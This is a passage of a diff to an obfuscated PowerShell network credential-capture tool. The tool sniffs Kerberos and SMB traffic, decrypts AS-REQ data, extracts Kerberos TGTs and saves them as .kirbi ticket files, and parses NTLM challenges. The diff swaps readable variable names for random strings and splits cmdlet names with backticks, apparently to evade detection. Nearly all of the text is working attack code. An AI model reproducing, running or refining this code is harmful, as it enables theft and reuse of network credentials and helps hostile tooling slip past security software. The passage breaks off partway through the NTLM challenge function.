+                    $zbjYuuoOrbtWJisHRUfQwenEKtjeeRkPyMAOc = Convert-DataToString 0 $TgpNBuNfSlXhTuvhOPjKxUDRCJlATkdGOxsaiotTbf $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + 8)..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $TgpNBuNfSlXhTuvhOPjKxUDRCJlATkdGOxsaiotTbf + 7)]
+                    $SrfGbdAYIpQgofwtYPvJXJFxRiyaHvyoZWDnjSGpBZMOI = $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $TgpNBuNfSlXhTuvhOPjKxUDRCJlATkdGOxsaiotTbf + 22)]
+                    $MwxuvtEARzqfzSacpfYTQcjATMfvfFMAcf = Convert-DataToString 0 $SrfGbdAYIpQgofwtYPvJXJFxRiyaHvyoZWDnjSGpBZMOI $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $TgpNBuNfSlXhTuvhOPjKxUDRCJlATkdGOxsaiotTbf + 23)..($OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $TgpNBuNfSlXhTuvhOPjKxUDRCJlATkdGOxsaiotTbf + $SrfGbdAYIpQgofwtYPvJXJFxRiyaHvyoZWDnjSGpBZMOI + 22)]
+                    $PBbgOFiNdkegZghDXtwWHRPrGaVaaS = [System.BitConverter]::ToString($AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF)
+                    $PBbgOFiNdkegZghDXtwWHRPrGaVaaS = $PBbgOFiNdkegZghDXtwWHRPrGaVaaS -replace "-",""
+                    $tLbBDJvMkKWqDcFfKWHq = $PBbgOFiNdkegZghDXtwWHRPrGaVaaS.IndexOf("A003020112A2")
 
-                    if($SongsStir -ge 0)
+                    if($tLbBDJvMkKWqDcFfKWHq -ge 0)
                     {
-                        $GateNasty = Get-ASN1Length $AskEffect[($SongsStir / 2 + 5)..($SongsStir / 2 + 10)]
-                        $TrashyMatch = $GateNasty[0]
-                        $GateNasty = Get-ASN1Length $AskEffect[($SongsStir / 2 + $TrashyMatch + 5)..($SongsStir / 2 + $TrashyMatch + 10)]
-                        $TrashyMatch += $GateNasty[0]
-                        $RushFog = $GateNasty[1]
-                        [Byte[]]$SixGrade = $AskEffect[($SongsStir / 2 + $TrashyMatch + 5)..($SongsStir / 2 + $TrashyMatch + $RushFog + 4)]
-                        [Byte[]]$AskEffect = Unprotect-HeapDetect $DollRotten $SixGrade[0..($SixGrade.Count - 13)]
-                        $AskEffect = $AskEffect[16..$AskEffect.Count]
-                        [Byte[]]$ChunkyPlay = Get-KirbiPartThree $AskEffect
-                        [Byte[]]$MiceEnjoy = Get-MiceEnjoy $JogPowder $ChunkyPlay
+                        $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND = Get-ASN1Length $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($tLbBDJvMkKWqDcFfKWHq / 2 + 5)..($tLbBDJvMkKWqDcFfKWHq / 2 + 10)]
+                        $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ = $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[0]
+                        $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND = Get-ASN1Length $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($tLbBDJvMkKWqDcFfKWHq / 2 + $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + 5)..($tLbBDJvMkKWqDcFfKWHq / 2 + $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + 10)]
+                        $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ += $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[0]
+                        $xkUeeAgowppjnpcqyHlyVcbyLQWEMJeUSnCSojspVUQn = $ToEpBpUCRMPavlWLiRkXyAwyjkryMQXMkND[1]
+                        [Byte[]]$iGBCzkWRuKGSNhAxCIvDXsHSQYCWrgxDqMrZiZKIW = $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[($tLbBDJvMkKWqDcFfKWHq / 2 + $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + 5)..($tLbBDJvMkKWqDcFfKWHq / 2 + $OMlOZaSDwVdkPZVKkLjNIWrklJpAwJGBTzJ + $xkUeeAgowppjnpcqyHlyVcbyLQWEMJeUSnCSojspVUQn + 4)]
+                        [Byte[]]$AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF = Unprotect-fanhQcOeQBmoBotjLVUmvltLESsAfwuewvn $eAUhBgHWHfdFohGZRXRwYmBoawzctiumKbaFJIWwD $iGBCzkWRuKGSNhAxCIvDXsHSQYCWrgxDqMrZiZKIW[0..($iGBCzkWRuKGSNhAxCIvDXsHSQYCWrgxDqMrZiZKIW.Count - 13)]
+                        $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF = $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF[16..$AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF.Count]
+                        [Byte[]]$cBiKFEXRziLqcSvbkAToWH = Get-KirbiPartThree $AYuMXIesgvcJIqFyMklneKIZGzWRXRqkYrKBcTRRfqYF
+                        [Byte[]]$DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh = Get-DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh $rXivEWsSeaRCMPfSkqVdDbNRtPXUeHBinEZKKFWmptiZN $cBiKFEXRziLqcSvbkAToWH
 
-                        if($StuffDark -notmatch '[^\x00-\x7F]+' -and $JoyousFound -notmatch '[^\x00-\x7F]+')
+                        if($MwxuvtEARzqfzSacpfYTQcjATMfvfFMAcf -notmatch '[^\x00-\x7F]+' -and $zbjYuuoOrbtWJisHRUfQwenEKtjeeRkPyMAOc -notmatch '[^\x00-\x7F]+')
                         {
-                            $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] $NeedyArt($BlowAware) Kerberos TGT captured for $StuffDark@$JoyousFound from $RejectFast") > $null   
-                            $LightOval.kerberos_TGT_list.Add($MiceEnjoy) > $null
-                            $LightOval.kerberos_TGT_username_list.Add("$StuffSky $StuffDark $JoyousFound $($LightOval.kerberos_TGT_list.Count - 1)") > $null
-                            $TraceRare = ($LightOval.kerberos_TGT_username_list -like "* $StuffDark $JoyousFound *").Count
+                            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] $TARrucOmQlOBzePOFHsFSOAIcpdw($oLTralsUhFsCccshiXXLsSDBjJkoreaPpGrOO) Kerberos TGT captured for $MwxuvtEARzqfzSacpfYTQcjATMfvfFMAcf@$zbjYuuoOrbtWJisHRUfQwenEKtjeeRkPyMAOc from $RCwIBkMHHWDnJkpbTUzbmnVUjDkqM") > $null   
+                            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.kerberos_TGT_list.Add($DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh) > $null
+                            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.kerberos_TGT_username_list.Add("$thtMcRgNbkQwDjgAUlJQZZSbTPlLcaDqnUeiUMd $MwxuvtEARzqfzSacpfYTQcjATMfvfFMAcf $zbjYuuoOrbtWJisHRUfQwenEKtjeeRkPyMAOc $($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.kerberos_TGT_list.Count - 1)") > $null
+                            $mrWRAWjCErggLMmOUOXKsx = ($sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.kerberos_TGT_username_list -like "* $MwxuvtEARzqfzSacpfYTQcjATMfvfFMAcf $zbjYuuoOrbtWJisHRUfQwenEKtjeeRkPyMAOc *").Count
                         }
 
-                        if($TraceRare -le $KindLick)
+                        if($mrWRAWjCErggLMmOUOXKsx -le $JoXWcoXEYHNGuWREHpaUFbcXY)
                         {
 
                             try
                             {
-                                $MoonAboard = $SilkySmelly + "\$StuffDark@$JoyousFound-TGT-$(Get-Date -format MMddhhmmssffff).kirbi"
-                                $SpoonWood = ne`w-`obje`ct System.IO.FileStream $MoonAboard,'Append','Write','Read'
-                                $SpoonWood.Write($MiceEnjoy,0,$MiceEnjoy.Count)
-                                $SpoonWood.close()
-                                $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $NeedyArt($BlowAware) Kerberos TGT for $StuffDark@$JoyousFound written to $MoonAboard") > $null
+                                $cmHZGSkqRjIgGVWWJsVDkXMsejuoMGJKaWttC = $NEfQfhYIiNOOsRWGcSaBKnaQpZTkphwGrbcV + "\$MwxuvtEARzqfzSacpfYTQcjATMfvfFMAcf@$zbjYuuoOrbtWJisHRUfQwenEKtjeeRkPyMAOc-TGT-$(Get-Date -format MMddhhmmssffff).kirbi"
+                                $wPgsAWOdyATVnpZWJNcGzNaFuOchiejjVSCNesdQN = ne`w`-`ob`je`ct System.IO.FileStream $cmHZGSkqRjIgGVWWJsVDkXMsejuoMGJKaWttC,'Append','Write','Read'
+                                $wPgsAWOdyATVnpZWJNcGzNaFuOchiejjVSCNesdQN.Write($DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh,0,$DDLlKpkvuLQNWrmUyCuOrHsoJZsIvcsKRzccqh.Count)
+                                $wPgsAWOdyATVnpZWJNcGzNaFuOchiejjVSCNesdQN.close()
+                                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[!] [$(Get-Date -format s)] $TARrucOmQlOBzePOFHsFSOAIcpdw($oLTralsUhFsCccshiXXLsSDBjJkoreaPpGrOO) Kerberos TGT for $MwxuvtEARzqfzSacpfYTQcjATMfvfFMAcf@$zbjYuuoOrbtWJisHRUfQwenEKtjeeRkPyMAOc written to $cmHZGSkqRjIgGVWWJsVDkXMsejuoMGJKaWttC") > $null
                             }
                             catch
                             {
                                 $error_message = $_.Exception.Message
                                 $error_message = $error_message -replace "`n",""
-                                $LightOval.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
+                                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[!] [$(Get-Date -format s)] $error_message $($_.InvocationInfo.Line.Trim())") > $null
                             }
 
                         }
@@ -2970,54 +2970,54 @@ $OrangeMushy =
                     }
                     else
                     {
-                        $LightOval.output_queue.Add("[-] [$(Get-Date -format s)] $NeedyArt($BlowAware) Kerberos TGT not found from $RejectFast") > $null    
+                        $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[-] [$(Get-Date -format s)] $TARrucOmQlOBzePOFHsFSOAIcpdw($oLTralsUhFsCccshiXXLsSDBjJkoreaPpGrOO) Kerberos TGT not found from $RCwIBkMHHWDnJkpbTUzbmnVUjDkqM") > $null    
                     }
 
                 }
                 else
                 {
-                    $LightOval.output_queue.Add("[-] [$(Get-Date -format s)] $NeedyArt($BlowAware) Kerberos autenticator not found from $SackUpbeat") > $null    
+                    $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[-] [$(Get-Date -format s)] $TARrucOmQlOBzePOFHsFSOAIcpdw($oLTralsUhFsCccshiXXLsSDBjJkoreaPpGrOO) Kerberos autenticator not found from $usUTZqgJkQQezJMfHEmjpiXkdQLuICkyERKgvvHpZTwgz") > $null    
                 }
 
             }
             else
             {
-                $LightOval.output_queue.Add("[-] [$(Get-Date -format s)] $NeedyArt($BlowAware) Kerberos failed to decrypt capture from $RejectFast") > $null    
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[-] [$(Get-Date -format s)] $TARrucOmQlOBzePOFHsFSOAIcpdw($oLTralsUhFsCccshiXXLsSDBjJkoreaPpGrOO) Kerberos failed to decrypt capture from $RCwIBkMHHWDnJkpbTUzbmnVUjDkqM") > $null    
             }
 
         }
         else
         {
             
-            if($CloudyDreary -like "*A0030201??A1030201*")
+            if($DUSyZzTBtSpSWmheaDHJTfRtVQmBADMx -like "*A0030201??A1030201*")
             {
 
-                if($CloudyDreary -like "*A003020111A1030201*")
+                if($DUSyZzTBtSpSWmheaDHJTfRtVQmBADMx -like "*A003020111A1030201*")
                 {
-                    $EmptyAbsurd = "AES128-CTS-HMAC-SHA1-96"
+                    $OFtCkqwiOzglONgRZGnQ = "AES128-CTS-HMAC-SHA1-96"
                 }
-                elseif($CloudyDreary -like "*A003020117A1030201*")
+                elseif($DUSyZzTBtSpSWmheaDHJTfRtVQmBADMx -like "*A003020117A1030201*")
                 {
-                    $EmptyAbsurd = "RC4-HMAC"
+                    $OFtCkqwiOzglONgRZGnQ = "RC4-HMAC"
                 }
-                elseif($CloudyDreary -like "*A003020118A1030201*")
+                elseif($DUSyZzTBtSpSWmheaDHJTfRtVQmBADMx -like "*A003020118A1030201*")
                 {
-                    $EmptyAbsurd = "RC4-HMAC-EXP"
+                    $OFtCkqwiOzglONgRZGnQ = "RC4-HMAC-EXP"
                 }
-                elseif($CloudyDreary -like "*A003020103A1030201*")
+                elseif($DUSyZzTBtSpSWmheaDHJTfRtVQmBADMx -like "*A003020103A1030201*")
                 {
-                    $EmptyAbsurd = "DES-CBC-MD5"
+                    $OFtCkqwiOzglONgRZGnQ = "DES-CBC-MD5"
                 }
-                elseif($CloudyDreary -like "*A003020101A1030201*")
+                elseif($DUSyZzTBtSpSWmheaDHJTfRtVQmBADMx -like "*A003020101A1030201*")
                 {
-                    $EmptyAbsurd = "DES-CBC-CRC"
+                    $OFtCkqwiOzglONgRZGnQ = "DES-CBC-CRC"
                 }
 
-                $LightOval.output_queue.Add("[-] [$(Get-Date -format s)] $NeedyArt($BlowAware) Kerberos unsupported encryption type $EmptyAbsurd from $RejectFast") > $null
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[-] [$(Get-Date -format s)] $TARrucOmQlOBzePOFHsFSOAIcpdw($oLTralsUhFsCccshiXXLsSDBjJkoreaPpGrOO) Kerberos unsupported encryption type $OFtCkqwiOzglONgRZGnQ from $RCwIBkMHHWDnJkpbTUzbmnVUjDkqM") > $null
             }
             else
             {
-                $LightOval.output_queue.Add("[-] [$(Get-Date -format s)] $NeedyArt($BlowAware) Kerberos failed to extract AS-REQ from $RejectFast") > $null 
+                $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[-] [$(Get-Date -format s)] $TARrucOmQlOBzePOFHsFSOAIcpdw($oLTralsUhFsCccshiXXLsSDBjJkoreaPpGrOO) Kerberos failed to extract AS-REQ from $RCwIBkMHHWDnJkpbTUzbmnVUjDkqM") > $null 
             }
                
         }
@@ -3027,150 +3027,150 @@ $OrangeMushy =
 }
 
 # Microsoft".
-$SuckFaded =
+$CuMFRHzqaheriSiNsNgplCLGmSOjjJFkTimavdFPXl =
 {
     
     function Get-SMBConnection
     {
-        param ([Byte[]]$MuscleRatty,[String]$DesignArrest,[String]$RiddlePizzas,[String]$ChurchSteep,[String]$HollowThick,[String]$FarGrowth)
+        param ([Byte[]]$zPlYIjTPqoNZzSUhtaTw,[String]$FDXPxyuZIoWvGFOYzFXkLHHcmknplvR,[String]$eNxwacaDJketGfaRHfQquIMMhYoskbVA,[String]$EKiVISKkvLLppXLMvJEBKXfSpklseJLQ,[String]$cjZpBGhKUHaTEXIBrvNWUB,[String]$qoIrusSxUrxdazZQJVSswSraapXPwPOIOpU)
 
-        $BabyVoice = [System.BitConverter]::ToString($MuscleRatty)
-        $BabyVoice = $BabyVoice -replace "-",""
-        $RejectFast = "$RiddlePizzas`:$HollowThick"
-        $ThinWoozy = "$ChurchSteep`:$FarGrowth"
-        $HeavyHop = $BabyVoice.IndexOf("FF534D42")
+        $ZszcaHKLNuouWZXGbNkptXrTNJqgKx = [System.BitConverter]::ToString($zPlYIjTPqoNZzSUhtaTw)
+        $ZszcaHKLNuouWZXGbNkptXrTNJqgKx = $ZszcaHKLNuouWZXGbNkptXrTNJqgKx -replace "-",""
+        $RCwIBkMHHWDnJkpbTUzbmnVUjDkqM = "$eNxwacaDJketGfaRHfQquIMMhYoskbVA`:$cjZpBGhKUHaTEXIBrvNWUB"
+        $qIEMwnoxtMkJyrLrirujFiQYVJJPBtDGmCuOvBDVVBza = "$EKiVISKkvLLppXLMvJEBKXfSpklseJLQ`:$qoIrusSxUrxdazZQJVSswSraapXPwPOIOpU"
+        $VpNeTdvxdnkfnRhmNYQzyvXeAAjpGS = $ZszcaHKLNuouWZXGbNkptXrTNJqgKx.IndexOf("FF534D42")
 
-        if(!$LightOval.SMB_session_table.ContainsKey($RejectFast) -and $HeavyHop -gt 0 -and $BabyVoice.SubString(($HeavyHop + 8),2) -eq "72" -and $RiddlePizzas -ne $DesignArrest)
+        if(!$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.SMB_session_table.ContainsKey($RCwIBkMHHWDnJkpbTUzbmnVUjDkqM) -and $VpNeTdvxdnkfnRhmNYQzyvXeAAjpGS -gt 0 -and $ZszcaHKLNuouWZXGbNkptXrTNJqgKx.SubString(($VpNeTdvxdnkfnRhmNYQzyvXeAAjpGS + 8),2) -eq "72" -and $eNxwacaDJketGfaRHfQquIMMhYoskbVA -ne $FDXPxyuZIoWvGFOYzFXkLHHcmknplvR)
         {
-            $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] SMB($FarGrowth) negotiation request detected from $RejectFast") > $null
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] SMB($qoIrusSxUrxdazZQJVSswSraapXPwPOIOpU) negotiation request detected from $RCwIBkMHHWDnJkpbTUzbmnVUjDkqM") > $null
         }
-        elseif(!$LightOval.SMB_session_table.ContainsKey($RejectFast) -and $HeavyHop -gt 0 -and $BabyVoice.SubString(($HeavyHop + 8),2) -eq "72" -and $RiddlePizzas -eq $DesignArrest)
+        elseif(!$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.SMB_session_table.ContainsKey($RCwIBkMHHWDnJkpbTUzbmnVUjDkqM) -and $VpNeTdvxdnkfnRhmNYQzyvXeAAjpGS -gt 0 -and $ZszcaHKLNuouWZXGbNkptXrTNJqgKx.SubString(($VpNeTdvxdnkfnRhmNYQzyvXeAAjpGS + 8),2) -eq "72" -and $eNxwacaDJketGfaRHfQquIMMhYoskbVA -eq $FDXPxyuZIoWvGFOYzFXkLHHcmknplvR)
         {
-            $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] SMB($HollowThick) outgoing negotiation request detected to $ThinWoozy") > $null
-        }
-
-        if(!$LightOval.SMB_session_table.ContainsKey($RejectFast) -and $HeavyHop -gt 0)
-        {
-            $LightOval.SMB_session_table.Add($RejectFast,"")
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] SMB($cjZpBGhKUHaTEXIBrvNWUB) outgoing negotiation request detected to $qIEMwnoxtMkJyrLrirujFiQYVJJPBtDGmCuOvBDVVBza") > $null
         }
 
-        $HeavyHop = $BabyVoice.IndexOf("FE534D42")
-
-        if(!$LightOval.SMB_session_table.ContainsKey($RejectFast) -and $HeavyHop -gt 0 -and $BabyVoice.SubString(($HeavyHop + 24),4) -eq "0000" -and $RiddlePizzas -ne $DesignArrest)
+        if(!$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.SMB_session_table.ContainsKey($RCwIBkMHHWDnJkpbTUzbmnVUjDkqM) -and $VpNeTdvxdnkfnRhmNYQzyvXeAAjpGS -gt 0)
         {
-            $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] SMB($FarGrowth) negotiation request detected from $RejectFast") > $null
-        }
-        elseif(!$LightOval.SMB_session_table.ContainsKey($RejectFast) -and $HeavyHop -gt 0 -and $BabyVoice.SubString(($HeavyHop + 24),4) -eq "0000" -and $RiddlePizzas -eq $DesignArrest)
-        {
-            $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] SMB($HollowThick) outgoing negotiation request detected to $ThinWoozy") > $null
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.SMB_session_table.Add($RCwIBkMHHWDnJkpbTUzbmnVUjDkqM,"")
         }
 
-        if(!$LightOval.SMB_session_table.ContainsKey($RejectFast) -and $HeavyHop -gt 0)
+        $VpNeTdvxdnkfnRhmNYQzyvXeAAjpGS = $ZszcaHKLNuouWZXGbNkptXrTNJqgKx.IndexOf("FE534D42")
+
+        if(!$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.SMB_session_table.ContainsKey($RCwIBkMHHWDnJkpbTUzbmnVUjDkqM) -and $VpNeTdvxdnkfnRhmNYQzyvXeAAjpGS -gt 0 -and $ZszcaHKLNuouWZXGbNkptXrTNJqgKx.SubString(($VpNeTdvxdnkfnRhmNYQzyvXeAAjpGS + 24),4) -eq "0000" -and $eNxwacaDJketGfaRHfQquIMMhYoskbVA -ne $FDXPxyuZIoWvGFOYzFXkLHHcmknplvR)
         {
-            $LightOval.SMB_session_table.Add($RejectFast,"")
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] SMB($qoIrusSxUrxdazZQJVSswSraapXPwPOIOpU) negotiation request detected from $RCwIBkMHHWDnJkpbTUzbmnVUjDkqM") > $null
+        }
+        elseif(!$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.SMB_session_table.ContainsKey($RCwIBkMHHWDnJkpbTUzbmnVUjDkqM) -and $VpNeTdvxdnkfnRhmNYQzyvXeAAjpGS -gt 0 -and $ZszcaHKLNuouWZXGbNkptXrTNJqgKx.SubString(($VpNeTdvxdnkfnRhmNYQzyvXeAAjpGS + 24),4) -eq "0000" -and $eNxwacaDJketGfaRHfQquIMMhYoskbVA -eq $FDXPxyuZIoWvGFOYzFXkLHHcmknplvR)
+        {
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] SMB($cjZpBGhKUHaTEXIBrvNWUB) outgoing negotiation request detected to $qIEMwnoxtMkJyrLrirujFiQYVJJPBtDGmCuOvBDVVBza") > $null
         }
 
-        $HeavyHop = $BabyVoice.IndexOf("2A864886F7120102020100")
-
-        if($HeavyHop -gt 0 -and $RiddlePizzas -ne $DesignArrest)
+        if(!$sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.SMB_session_table.ContainsKey($RCwIBkMHHWDnJkpbTUzbmnVUjDkqM) -and $VpNeTdvxdnkfnRhmNYQzyvXeAAjpGS -gt 0)
         {
-            $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] SMB($FarGrowth) authentication method is Kerberos for $RejectFast") > $null
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.SMB_session_table.Add($RCwIBkMHHWDnJkpbTUzbmnVUjDkqM,"")
+        }
 
-            if($HeapDetect -eq 'Y')
+        $VpNeTdvxdnkfnRhmNYQzyvXeAAjpGS = $ZszcaHKLNuouWZXGbNkptXrTNJqgKx.IndexOf("2A864886F7120102020100")
+
+        if($VpNeTdvxdnkfnRhmNYQzyvXeAAjpGS -gt 0 -and $eNxwacaDJketGfaRHfQquIMMhYoskbVA -ne $FDXPxyuZIoWvGFOYzFXkLHHcmknplvR)
+        {
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] SMB($qoIrusSxUrxdazZQJVSswSraapXPwPOIOpU) authentication method is Kerberos for $RCwIBkMHHWDnJkpbTUzbmnVUjDkqM") > $null
+
+            if($fanhQcOeQBmoBotjLVUmvltLESsAfwuewvn -eq 'Y')
             {
-                $RateBabies = Get-UInt16DataLength 0 $MuscleRatty[82..83]
-                $RateBabies -= $HeavyHop / 2
-                $RemindHammer = $MuscleRatty[($HeavyHop/2)..($HeavyHop/2 + $MuscleRatty.Count)]
+                $wZzzTVPPlcYArKIGiTrO = Get-UInt16DataLength 0 $zPlYIjTPqoNZzSUhtaTw[82..83]
+                $wZzzTVPPlcYArKIGiTrO -= $VpNeTdvxdnkfnRhmNYQzyvXeAAjpGS / 2
+                $WqTrCsstSbMGXjhlbGnPKYxQ = $zPlYIjTPqoNZzSUhtaTw[($VpNeTdvxdnkfnRhmNYQzyvXeAAjpGS/2)..($VpNeTdvxdnkfnRhmNYQzyvXeAAjpGS/2 + $zPlYIjTPqoNZzSUhtaTw.Count)]
             }
 
         }
-        elseif($HeavyHop -gt 0 -and $RiddlePizzas -eq $DesignArrest)
+        elseif($VpNeTdvxdnkfnRhmNYQzyvXeAAjpGS -gt 0 -and $eNxwacaDJketGfaRHfQquIMMhYoskbVA -eq $FDXPxyuZIoWvGFOYzFXkLHHcmknplvR)
         {
-            $LightOval.output_queue.Add("[+] [$(Get-Date -format s)] SMB($HollowThick) outgoing authentication method is Kerberos to $ThinWoozy") > $null
+            $sUEVxgodFQWsKUzqBlrvcguRVrUXNbafKV.output_queue.Add("[+] [$(Get-Date -format s)] SMB($cjZpBGhKUHaTEXIBrvNWUB) outgoing authentication method is Kerberos to $qIEMwnoxtMkJyrLrirujFiQYVJJPBtDGmCuOvBDVVBza") > $null
 
-            if($HeapDetect -eq 'Y')
+            if($fanhQcOeQBmoBotjLVUmvltLESsAfwuewvn -eq 'Y')
             {
-                $RateBabies = Get-UInt16DataLength 0 $MuscleRatty[82..83]
-                $RateBabies -= $HeavyHop / 2
-                $RemindHammer = $MuscleRatty[($HeavyHop/2)..($HeavyHop/2 + $MuscleRatty.Count)]
+                $wZzzTVPPlcYArKIGiTrO = Get-UInt16DataLength 0 $zPlYIjTPqoNZzSUhtaTw[82..83]
+                $wZzzTVPPlcYArKIGiTrO -= $VpNeTdvxdnkfnRhmNYQzyvXeAAjpGS / 2
+                $WqTrCsstSbMGXjhlbGnPKYxQ = $zPlYIjTPqoNZzSUhtaTw[($VpNeTdvxdnkfnRhmNYQzyvXeAAjpGS/2)..($VpNeTdvxdnkfnRhmNYQzyvXeAAjpGS/2 + $zPlYIjTPqoNZzSUhtaTw.Count)]
             }
 
         }
 
-        return $RateBabies,$RemindHammer
+        return $wZzzTVPPlcYArKIGiTrO,$WqTrCsstSbMGXjhlbGnPKYxQ
     }
 
     function Get-SMBNTLMChallenge
     {
-        param ([Byte[]]$MuscleRatty)
+        param ([Byte[]]$zPlYIjTPqoNZzSUhtaTw)
 
-        $BabyVoice = [System.BitConverter]::ToString($MuscleRatty)
-        $BabyVoice = $BabyVoice -replace "-",""
-        $AwarePick = $BabyVoice.IndexOf("4E544C4D53535000")
+        $ZszcaHKLNuouWZXGbNkptXrTNJqgKx = [System.BitConverter]::ToString($zPlYIjTPqoNZzSUhtaTw)
+        $ZszcaHKLNuouWZXGbNkptXrTNJqgKx = $ZszcaHKLNuouWZXGbNkptXrTNJqgKx -replace "-",""
+        $enGCyCmxHJrRsHyKCFqLBoWgvuceSNeSuzYScNefgG = $ZszcaHKLNuouWZXGbNkptXrTNJqgKx.IndexOf("4E544C4D53535000")
 
-        if($AwarePick -gt 0)
+        if($enGCyCmxHJrRsHyKCFqLBoWgvuceSNeSuzYScNefgG -gt 0)
         {
 
-            if($BabyVoice.SubString(($AwarePick + 16),8) -eq "02000000")
+            if($ZszcaHKLNuouWZXGbNkptXrTNJqgKx.SubString(($enGCyCmxHJrRsHyKCFqLBoWgvuceSNeSuzYScNefgG + 16),8) -eq "02000000")
             {
-                $EggsExist = $BabyVoice.SubString(($AwarePick + 48),16)
+                $eXAKzprnnPiPECgCmrSMRcuHgJGyqXtOjE = $ZszcaHKLNuouWZXGbNkptXrTNJqgKx.SubString(($enGCyCmxHJrRsHyKCFqLBoWgvuceSNeSuzYScNefgG + 48),16)
             }
 
-            $EasyTested = Get-UInt16DataLength (($AwarePick + 24) / 2) $MuscleRatty
-            $RaggedMessy = [System.Convert]::ToInt16(($BabyVoice.SubString(($AwarePick + 44),2)),16)
-            $RaggedMessy = [Convert]::ToString($RaggedMessy,2)
-            $GrayKneel = $RaggedMessy.SubString(0,1)
+            $FozfUGUDzhlEtHZpkTIorvIgaIkWsKraYcH = Get-UInt16DataLength (($enGCyCmxHJrRsHyKCFqLBoWgvuceSNeSuzYScNefgG + 24) / 2) $zPlYIjTPqoNZzSUhtaTw
+            $gklXiBbsMfCjTWggCTGzqqWaNyrpfdehWkIPFvWJRI = [System.Convert]::ToInt16(($ZszcaHKLNuouWZXGbNkptXrTNJqgKx.SubString(($enGCyCmxHJrRsHyKCFqLBoWgvuceSNeSuzYScNefgG + 44),2)),16)
+            $gklXiBbsMfCjTWggCTGzqqWaNyrpfdehWkIPFvWJRI = [Convert]::ToString($gklXiBbsMfCjTWggCTGzqqWaNyrpfdehWkIPFvWJRI,2)
+            $RiLMQIAKnLSqNzMcONfVzgWw = $gklXiBbsMfCjTWggCTGzqqWaNyrpfdehWkIPFvWJRI.SubString(0,1)
 
-            if($GrayKneel -eq 1)
+            if($RiLMQIAKnLSqNzMcONfVzgWw -eq 1)
             {
-                $RollGreat = ($AwarePick + 80) / 2
-                $RollGreat = $RollGreat + $EasyTested + 16
-                $RaggedMemory = $MuscleRatty[$RollGreat]
-                $ColorReply = 0
+                $yesTdlnJczRCehbGsYrD = ($enGCyCmxHJrRsHyKCFqLBoWgvuceSNeSuzYScNefgG + 80) / 2
